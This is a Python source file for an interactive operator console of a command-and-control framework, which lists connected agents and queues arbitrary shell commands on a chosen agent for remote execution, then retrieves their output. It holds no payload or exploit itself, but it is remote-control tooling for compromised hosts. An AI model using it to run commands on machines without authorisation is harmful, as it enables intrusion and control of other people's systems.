"""
Operator CLI
Terminal interface for the C2 operator.
Communicates with the server exclusively via the REST API.

Usage:
    python operator_cli.py [--url http://127.0.0.1:8081] [--token changeme]
"""

import argparse
import cmd
import json
import sys
import time

try:
    import requests
except ImportError:
    sys.exit("Missing dependency: pip install requests")

BANNER = r"""
   ___   ___ ___
  / __| |_  ) __|
 | (__   / /| _|
  \___| /___|_|

  C2 Operator Console
  type 'help' for commands
"""


class ApiClient:
    def __init__(self, base_url: str, token: str):
        self._base = base_url.rstrip("/")
        self._s = requests.Session()
        self._s.headers["X-Auth-Token"] = token
        self._s.timeout = 10

    def get(self, path: str) -> dict | list:
        r = self._s.get(f"{self._base}{path}")
        r.raise_for_status()
        return r.json()

    def post(self, path: str, body: dict) -> dict:
        r = self._s.post(f"{self._base}{path}", json=body)
        r.raise_for_status()
        return r.json()


class C2CLI(cmd.Cmd):
    intro = BANNER
    prompt = "c2> "

    def __init__(self, api: ApiClient):
        super().__init__()
        self._api = api
        self._agent_id: str | None = None

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    def _require_agent(self) -> bool:
        if not self._agent_id:
            print("[!] No agent selected. Run: use <agent_id>")
            return False
        return True

    def _print_table(self, rows: list[dict], columns: list[str]):
        if not rows:
            print("  (none)")
            return
        widths = {c: len(c) for c in columns}
        for row in rows:
            for c in columns:
                widths[c] = max(widths[c], len(str(row.get(c, ""))))
        header = "  ".join(c.upper().ljust(widths[c]) for c in columns)
        print(header)
        print("-" * len(header))
        for row in rows:
            print("  ".join(str(row.get(c, "")).ljust(widths[c]) for c in columns))

    # ------------------------------------------------------------------
    # Commands
    # ------------------------------------------------------------------
    def do_agents(self, _):
        """List all registered agents."""
        try:
            agents = self._api.get("/agents")
            self._print_table(agents, ["id", "hostname", "ip", "os", "last_seen", "status"])
        except Exception as e:
            print(f"[!] {e}")

    def do_use(self, agent_id: str):
        """Select an agent to interact with:  use <agent_id>"""
        agent_id = agent_id.strip()
        if not agent_id:
            print("Usage: use <agent_id>")
            return
        try:
            self._api.get(f"/agents/{agent_id}")
            self._agent_id = agent_id
            short = agent_id[:8]
            self.prompt = f"c2 [{short}]> "
            print(f"[+] Agent selected: {agent_id}")
        except requests.HTTPError as e:
            print(f"[!] {e}")

    def do_info(self, _):
        """Show details of the selected agent."""
        if not self._require_agent():
            return
        try:
            agent = self._api.get(f"/agents/{self._agent_id}")
            for k, v in agent.items():
                print(f"  {k:<15} {v}")
        except Exception as e:
            print(f"[!] {e}")

    def do_shell(self, command: str):
        """
        Queue a shell command on the selected agent:  shell <command>
        The agent executes it on its next check-in.
        """
        if not self._require_agent():
            return
        command = command.strip()
        if not command:
            print("Usage: shell <command>")
            return
        try:
            resp = self._api.post(
                f"/agents/{self._agent_id}/tasks",
                {"capability": "shell_exec", "params": {"command": command}},
            )
            print(f"[+] Task queued: {resp['task_id']}")
            print(f"    Run 'result {resp['task_id']}' to fetch output.")
        except Exception as e:
            print(f"[!] {e}")

    def do_tasks(self, _):
        """List all tasks for the selected agent."""
        if not self._require_agent():
            return
        try:
            tasks = self._api.get(f"/agents/{self._agent_id}/tasks")
            self._print_table(tasks, ["id", "capability", "status", "created_at"])
        except Exception as e:
            print(f"[!] {e}")

    def do_result(self, task_id: str):
        """
        Fetch the result of a task:  result <task_id>
        Use --watch to poll until the task completes.
        """
        parts = task_id.split()
        watch = "--watch" in parts
        tid = next((p for p in parts if not p.startswith("-")), "").strip()
        if not tid:
            print("Usage: result <task_id> [--watch]")
            return
        try:
            while True:
                task = self._api.get(f"/tasks/{tid}")
                status = task.get("status", "?")
                if status in ("completed", "failed") or not watch:
                    print(f"  Status    : {status}")
                    print(f"  Capability: {task.get('capability')}")
                    if task.get("result"):
                        print(f"  Output:\n{task['result']}")
                    else:
                        print("  (no output yet)")
                    break
                print(f"  Status: {status} — waiting…")
                time.sleep(2)
        except Exception as e:
            print(f"[!] {e}")

    def do_capabilities(self, _):
        """List capabilities registered on the server."""
        try:
            caps = self._api.get("/capabilities")
            self._print_table(caps, ["name", "description"])
        except Exception as e:
            print(f"[!] {e}")

    def do_back(self, _):
        """Deselect the current agent."""
        self._agent_id = None
        self.prompt = "c2> "
        print("[*] Agent deselected.")

    def do_exit(self, _):
        """Exit the operator console."""
        print("Bye.")
        return True

    do_quit = do_exit

    # Silence default Cmd error for unknown commands
    def default(self, line: str):
        print(f"[!] Unknown command: {line.split()[0]}  (type 'help' for a list)")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="C2 Operator CLI")
    parser.add_argument("--url",   default="http://127.0.0.1:9001", help="Operator API URL")
    parser.add_argument("--token", default="changeme", help="Auth token")
    args = parser.parse_args()

    api = ApiClient(args.url, args.token)

    # Quick connectivity check
    try:
        api.get("/capabilities")
    except requests.ConnectionError:
        sys.exit(f"[!] Cannot connect to server at {args.url}")
    except requests.HTTPError as e:
        if e.response.status_code == 401:
            sys.exit("[!] Invalid auth token.")
        raise

    C2CLI(api).cmdloop()


if __name__ == "__main__":
    main()
